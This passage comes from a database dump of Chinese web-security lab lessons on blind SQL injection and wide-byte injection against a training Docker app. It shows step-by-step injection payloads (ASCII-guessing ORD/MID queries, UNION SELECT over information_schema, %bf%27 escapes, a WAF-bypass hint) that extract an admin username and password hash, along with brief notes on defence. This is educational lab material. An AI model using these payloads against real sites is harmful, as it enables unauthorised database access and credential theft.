1,1.所以知道这是第二张表。有兴趣的学员可以猜测一下第一张表 limit 0,1</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7765625f7573657273 AND table_schema=0x77656274657374),1,1))=49 %23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=<span class=\"hljs-number\">0x7765625f7573657273</span> <span class=\"hljs-keyword\">AND</span> table_schema=<span class=\"hljs-number\">0x77656274657374</span>),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">48</span> %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2754.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8722.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>得出列名个数为10，涉及到的具体参数希望学员自己查资料搞清楚。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7765625f7573657273 AND table_schema=0x77656274657374 LIMIT 3,1),1,1))=117 %23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(column_name <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=<span class=\"hljs-number\">0x7765625f7573657273</span> <span class=\"hljs-keyword\">AND</span> table_schema=<span class=\"hljs-number\">0x77656274657374</span> LIMIT <span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span> %<span class=\"hljs-number\">23</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7765625f7573657273 AND table_schema=0x77656274657374 LIMIT 3,1),3,1))=101 %23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(column_name <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=<span class=\"hljs-number\">0x7765625f7573657273</span> <span class=\"hljs-keyword\">AND</span> table_schema=<span class=\"hljs-number\">0x77656274657374</span> LIMIT <span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">114</span> %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2755.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8723.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的方法猜解出列名user</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7765625f7573657273 AND table_schema=0x77656274657374 LIMIT 4,1),1,1))=112 %23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(column_name <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=<span class=\"hljs-number\">0x7765625f7573657273</span> <span class=\"hljs-keyword\">AND</span> table_schema=<span class=\"hljs-number\">0x77656274657374</span> LIMIT <span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">97</span> %<span class=\"hljs-number\">23</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7765625f7573657273 AND table_schema=0x77656274657374 LIMIT 4,1),3,1))=115 %23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(column_name <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=<span class=\"hljs-number\">0x7765625f7573657273</span> <span class=\"hljs-keyword\">AND</span> table_schema=<span class=\"hljs-number\">0x77656274657374</span> LIMIT <span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span> %<span class=\"hljs-number\">23</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7765625f7573657273 AND table_schema=0x77656274657374 LIMIT 4,1),5,1))=119 %23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(column_name <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=<span class=\"hljs-number\">0x7765625f7573657273</span> <span class=\"hljs-keyword\">AND</span> table_schema=<span class=\"hljs-number\">0x77656274657374</span> LIMIT <span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">111</span> %<span class=\"hljs-number\">23</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7765625f7573657273 AND table_schema=0x77656274657374 LIMIT 4,1),7,1))=114 %23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(column_name <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=<span class=\"hljs-number\">0x7765625f7573657273</span> <span class=\"hljs-keyword\">AND</span> table_schema=<span class=\"hljs-number\">0x77656274657374</span> LIMIT <span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">100</span> %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2756.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8724.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的方法可以猜解出字段password</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(`user` AS CHAR),0x20) FROM webtest.web_users  LIMIT 0,1),1,1))=97%23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(`user` <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM webtest.web_users  LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">100</span>%<span class=\"hljs-number\">23</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(`user` AS CHAR),0x20) FROM webtest.web_users  LIMIT 0,1),3,1))=109%23\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(`user` <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM webtest.web_users  LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">105</span>%<span class=\"hljs-number\">23</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(`user` AS CHAR),0x20) FROM webtest.web_users  LIMIT 0,1),5,1))=110%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2757.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8725.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>猜出user中的账号为 admin &nbsp;注意limit0,1 学员可以尝试猜猜limit1,1</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' AND ORD(MID((SELECT IFNULL(CAST(`password` AS CHAR),0x20) FROM webtest.web_users  LIMIT 0,1),1,1))=101%23\r\n\r\n…………\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=1\'</span> <span class=\"hljs-keyword\">AND</span> ORD(MID((SELECT IFNULL(CAST(`password` <span class=\"hljs-keyword\">AS</span> CHAR),<span class=\"hljs-number\">0x20</span>) FROM webtest.web_users  LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">32</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">101</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2758.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8726.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的猜测得到password 字段的值e10adc3949ba59abbe56e057f20f883e</p><p>备注：上面猜测语句中最后的数字为字母对应的ascii码值</p><p>然后拿密码去解密就可以登录后台。</p>',2,'http://oda8mr8yr.bkt.clouddn.com/sql%E6%A0%873.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-11 15:13:42',1,NULL,'<h2>分析与思考：</h2><p>1）&nbsp;SQL盲注的原理</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps2759.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8727.png\"></p><p>上面是盲注的代码，下面我们看下普通的爆错注入的代码。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps275A.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8728.png\"></p><p>通过对比发现核心代码中基本没变化。盲注只是少了回显而已，即mysql_error()。所以盲注依然是存在sql注入的，只是不再回显爆错语句，所以需要我们去猜测，使用更多的mysql内置函数来判断猜测。</p><p>2）&nbsp;SQL盲注的防范</p><p>和防止普通的sql注入一样。就本系统代码来说，需要使用mysql_real_escape_string或者addslashes函数做过滤。</p><h2>课后拓展</h2><p>方向一：通过查资料了解sql盲注的分类以及原理；</p><p>方向二：通过查资料了解除mysql之外的其他数据库比如access,sqlserver等数据库的手工注入语句，从而了解其它数据库的特性；</p><p>方向三：通过查资料了解sql注入在不同场景中的使用方式；</p><p><br></p><p><br></p>',1,''),(19,'SQL盲注基础训练二','通过攻防教学实验系统中的web系统做sql盲注练习，并且深刻认识掌握其原理，从而理解sql注入在不同场景中的应用。','<h1><span style=\"color: inherit; font-family: inherit; font-size: 30px;\">实验步骤：</span><br></h1><p>1）&nbsp;在WEB系统中的参数后面加入恶意字符测试，查看是否报错；下面为盲注得到关键数据的语句，我们直接加单引号看看情况。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps4099.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%871.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>从图中我们看出没有出现爆错信息，但是页面和没加单引号的时候不一样了。然后我们继续测试。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span>=<span class=\"hljs-number\">1</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps409A.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%872.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span>=<span class=\"hljs-number\">2</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps40AB.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%873.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的测试基本可以确定是存在注入的，但是没有爆错信息，所以为盲注。注意这次测试没加单引号，学员可以加单引号测试一下，然后思考原因。盲注的原理后面详细分析。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>%<span class=\"hljs-number\">20</span>left(version(),<span class=\"hljs-number\">1</span>)=<span class=\"hljs-number\">4</span> 不返回数据\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>%<span class=\"hljs-number\">20</span>left(version(),<span class=\"hljs-number\">1</span>)=<span class=\"hljs-number\">5</span> 返回数据</code></pre><p>通过上面的可以判断出为5版本的数据库。注意下面的很多语句出现了+。用加号代替了空格，这也是sql注入以后绕过简单waf的一种方式。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span>+length(database())=<span class=\"hljs-number\">6</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span>+length(database())=<span class=\"hljs-number\">7</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span>+length(database())=<span class=\"hljs-number\">8</span></code></pre><p>通过上面的语句基本可以得出数据库的长度为7。实战中我们可以从1开始一直猜测直到出现正确的结果为止。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>order%<span class=\"hljs-number\">20</span>by%<span class=\"hljs-number\">201</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>order%<span class=\"hljs-number\">20</span>by%<span class=\"hljs-number\">202</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>order%<span class=\"hljs-number\">20</span>by%<span class=\"hljs-number\">203</span></code></pre><p>通过上面的语句得到可以显示数据的字段数</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">20</span>version(),database()</code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps40AC.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%874.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>上面的语句可以得到数据库的版本和数据库名字。学员可以对比一下上一节我们所使用的语句和这一节所使用的语句有什么不同的地方。通过比较应该可以发现使用unoin即联合查询要方便，更容易得到数据。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">20</span>table_name,<span class=\"hljs-number\">2</span>%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>information_schema.tables%<span class=\"hljs-number\">20</span>where%<span class=\"hljs-number\">20</span>table_schema=<span class=\"hljs-number\">0x77656274657374</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps40AD.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%875.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的可以得到表名，web_users</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">20</span>column_name,<span class=\"hljs-number\">2</span>%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>information_schema.columns%<span class=\"hljs-number\">20</span>where%<span class=\"hljs-number\">20</span>table_name=<span class=\"hljs-number\">0x7765625f7573657273</span>%<span class=\"hljs-number\">20</span>limit%<span class=\"hljs-number\">204</span>,<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps40AE.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%876.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">20</span>column_name,<span class=\"hljs-number\">2</span>%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>information_schema.columns%<span class=\"hljs-number\">20</span>where%<span class=\"hljs-number\">20</span>table_name=<span class=\"hljs-number\">0x7765625f7573657273</span>%<span class=\"hljs-number\">20</span>limit%<span class=\"hljs-number\">205</span>,<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps40BE.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%877.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的猜测可以得到字段user password</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">20</span>user,password%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>web_users%<span class=\"hljs-number\">20</span>limit%<span class=\"hljs-number\">201</span>,<span class=\"hljs-number\">1</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps40BF.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%878.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的猜测得到password 字段的值e10adc3949ba59abbe56e057f20f883e</p><p>备注：上面猜测语句中最后的数字为字母对应的ascii码值</p><p>然后拿密码去解密就可以登录后台。</p>',2,'http://oda8mr8yr.bkt.clouddn.com/sql%E6%A0%873.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-11 15:19:36',1,NULL,'<h2>分析与思考：</h2><p>1）&nbsp;SQL盲注的原理</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps40C0.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%879.png\"></p><p>上面是盲注的代码，下面我们看下普通的爆错注入的代码。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps40C1.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm2%E5%9B%BE%E7%89%8710.png\"></p><p>通过对比发现核心代码中基本没变化。盲注只是少了回显而已，即mysql_error()。所以盲注依然是存在sql注入的，只是不再回显爆错语句，所以需要我们去猜测，使用更多的mysql内置函数来判断猜测。</p><p>2）&nbsp;SQL盲注的防范</p><p>和防止普通的sql注入一样。就本系统代码来说，需要使用<span style=\"font-size: inherit; font-family: Menlo, Monaco, Consolas, \'Courier New\', monospace; line-height: 1.5; white-space: pre-wrap; background-color: rgb(248, 248, 248);\">mysql_real_escape_string</span>或者<span style=\"font-size: inherit; font-family: Menlo, Monaco, Consolas, \'Courier New\', monospace; line-height: 1.5; white-space: pre-wrap; background-color: rgb(248, 248, 248);\">addslashes</span>函数做过滤。</p><p>备注：这节课和上一节课盲注所使用的数据库代码并不一样，这样做的目的是为了让大家有一个比较。并且告诉大家sql注入的过程可以做很多的发挥，为以后sql注入绕过waf以及fuzzing数据库做一些前期的准备。</p><h2>课后拓展</h2><p>方向一：通过查资料了解sql盲注的分类以及原理；</p><p>方向二：通过查资料了解除mysql之外的其他数据库比如access,sqlserver等数据库的手工注入语句，从而了解其它数据库的特性；</p><p>方向三：通过查资料了解sql注入在不同场景中的使用方式；</p><p>方向四：了解更多可以用来做sql注入的函数以及使用方式。</p><p></p><p>方向五：学习好sql语句，通过实际的编程去了解。</p><p><br></p>',1,''),(20,'宽字节注入训练一','通过攻防教学实验系统中的web系统做sql盲注练习，并且深刻认识掌握其原理，从而理解sql注入在不同场景中的应用。','<h1><span style=\"color: inherit; font-family: inherit; font-size: 30px;\">实验步骤：</span><br></h1><p>1）&nbsp;在WEB系统中通过之前学习的sql注入的方式看看能否得到数据库中的敏感数据</p><p>2）&nbsp;在WEB系统中的参数后面加入恶意字符测试，查看是否报错；下面为宽字节注入得到关键数据的语句</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_wide/index.php\r\n\r\n/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27</span></code></pre><p>测试报错存在宽字节注入</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27</span> order by <span class=\"hljs-number\">2</span> %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8D61.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%871.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27</span> order by <span class=\"hljs-number\">3</span> %<span class=\"hljs-number\">23</span></code></pre><p>测试查询语句存在的字段数</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8D91.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%872.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>从上面的报错结果可以看出order by 的列数有两个</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27</span> union select <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span> %<span class=\"hljs-number\">23</span></code></pre><p>页面显示数字的地方表示可以返回数据</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8D92.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%873.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27</span> union select <span class=\"hljs-number\">1</span>,database() %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8DA3.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%874.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>注：database()可替换成其它mysql函数(如:version(),@@basedir等)</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27 </span><span style=\"font-size: inherit; line-height: 1.5;\">union select </span><span class=\"hljs-number\" style=\"font-size: inherit;\">1</span><span style=\"font-size: inherit; line-height: 1.5;\">,table_name from information_schema.tables where table_schema=</span><span class=\"hljs-number\" style=\"font-size: inherit;\">0x77656274657374</span><span style=\"font-size: inherit; line-height: 1.5;\">  %</span><span class=\"hljs-number\" style=\"font-size: inherit;\">23</span></code></pre><p>注：table_schema=[库名]，库名要转换成16进制。</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8DA4.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%875.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27 </span>union select <span class=\"hljs-number\">1</span>,column_name from information_schema.columns where table_name=<span class=\"hljs-number\">0x7765625F7573657273</span>  %<span class=\"hljs-number\">23</span></code></pre><p>注：table_name=[表名]，表名要转换成16进制。</p><p><img 